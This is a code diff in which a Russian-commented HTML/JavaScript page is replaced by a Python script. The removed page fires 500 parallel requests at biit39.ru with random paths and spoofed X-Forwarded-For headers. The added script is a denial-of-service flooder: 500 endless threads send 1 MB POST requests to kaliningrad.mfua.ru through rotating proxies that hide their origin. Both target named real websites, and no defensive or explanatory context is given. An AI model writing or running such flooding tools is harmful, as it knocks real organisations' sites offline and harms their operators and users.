@@ -1,132 +1,56 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Проверка ссылок с изменением IP</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        button, input {
-            padding: 10px;
-            margin: 5px;
-            font-size: 16px;
-            cursor: pointer;
-        }
-        ul {
-            margin-top: 20px;
-            list-style: none;
-            padding: 0;
-            max-height: 300px;
-            overflow-y: auto;
-            border: 1px solid #ccc;
-        }
-        li {
-            margin: 5px 0;
-        }
-        .working {
-            color: green;
-            font-weight: bold;
-        }
-        .not-working {
-            color: red;
-        }
-    </style>
-</head>
-<body>
-    <h1>Проверка ссылок с изменением IP</h1>
-    <label for="url">Введите базовый URL (например, https://biit39.ru/):</label><br>
-    <input type="text" id="url" value="https://biit39.ru/" style="width: 100%;"><br>
-    <button id="start">Начать проверку</button>
-    <button id="stop" disabled>Остановить</button>
-    <ul id="results"></ul>
+import requests
+import threading
+import random
+import string
 
-    <script>
-        let isRunning = false;
-        const proxies = [
-            'http://208.75.97.97:8080',
-            'http://200.89.178.2:3128',
-            'http://185.2.7.25:8080',
-            'http://47.74.9.20:8080',
-            'http://45.77.174.156:8080'
-        ];
+# URL вашего сайта
+url = "https://kaliningrad.mfua.ru/"
 
-        // Функция для генерации случайного идентификатора (10 случайных цифр)
-        function generateRandomId() {
-            return Math.floor(1000000000 + Math.random() * 9000000000).toString();
-        }
+# Список прокси-серверов
+proxy_list = [
+    "http://200.55.249.135:80",
+    "http://182.53.245.241:443",
+    "http://213.197.136.218:1080",
+    "http://23.227.199.108:1080",
+    "http://47.74.9.20:8080",
+]
 
-        // Функция для отправки запроса с прокси
-        async function checkLinkWithProxy(url, proxy) {
-            try {
-                const response = await fetch(url, {
-                    method: 'HEAD',
-                    headers: {
-                        'X-Forwarded-For': proxy // Используем прокси
-                    }
-                });
-                return response.ok;
-            } catch (error) {
-                return false;
+# Функция для генерации случайных данных
+def generate_large_data(size=1024 * 1024):  # 1 MB данных
+    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
+
+# Функция для отправки POST-запроса через прокси
+def send_post_request(thread_id):
+    while True:
+        try:
+            # Генерация больших данных
+            data = {"payload": generate_large_data()}
+            
+            # Выбор случайного прокси из списка
+            proxy = random.choice(proxy_list)
+            proxies = {
+                "http": proxy,
+                "https": proxy,
             }
-        }
+            
+            # Отправка POST-запроса
+            response = requests.post(url, data=data, proxies=proxies, timeout=10)
+            
+            # Логирование ответа
+            print(f"[Thread {thread_id}] Proxy: {proxy}, Status: {response.status_code}, Response: {response.text}")
+        except Exception as e:
+            print(f"[Thread {thread_id}] Proxy: {proxy}, Ошибка: {e}")
 
-        // Проверка ссылки с выбором прокси
-        async function continuousCheckWithProxy(baseUrl, threadId) {
-            const results = document.getElementById("results");
+# Количество потоков
+num_threads = 500
 
-            while (isRunning) {
-                const randomId = generateRandomId();
-                const url = `${baseUrl}${randomId}`;
-                const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+# Запуск потоков
+threads = []
+for i in range(num_threads):
+    thread = threading.Thread(target=send_post_request, args=(i,))
+    threads.append(thread)
+    thread.start()
 
-                const isValid = await checkLinkWithProxy(url, proxy);
-
-                const listItem = document.createElement("li");
-                listItem.textContent = `Thread ${threadId}: ${url}`;
-
-                if (isValid) {
-                    listItem.className = "working";
-                } else {
-                    listItem.className = "not-working";
-                }
-
-                results.appendChild(listItem);
-                results.scrollTop = results.scrollHeight; // Прокрутка вниз для новых ссылок
-            }
-        }
-
-        // Функция для запуска проверки
-        function startChecking() {
-            const baseUrl = document.getElementById("url").value.trim();
-
-            if (!baseUrl.startsWith("http")) {
-                alert("Пожалуйста, введите корректный URL!");
-                return;
-            }
-
-            isRunning = true;
-            document.getElementById("start").disabled = true;
-            document.getElementById("stop").disabled = false;
-
-            // Запускаем 500 потоков с прокси
-            for (let i = 0; i < 500; i++) {
-                continuousCheckWithProxy(baseUrl, i);
-            }
-        }
-
-        // Остановка проверки
-        function stopChecking() {
-            isRunning = false;
-            document.getElementById("start").disabled = false;
-            document.getElementById("stop").disabled = true;
-        }
-
-        // Добавляем обработчики кнопок
-        document.getElementById("start").addEventListener("click", startChecking);
-        document.getElementById("stop").addEventListener("click", stopChecking);
-    </script>
-</body>
-</html>
+# Ожидание завершения потоков
+for thread in threads:
+    thread.join()
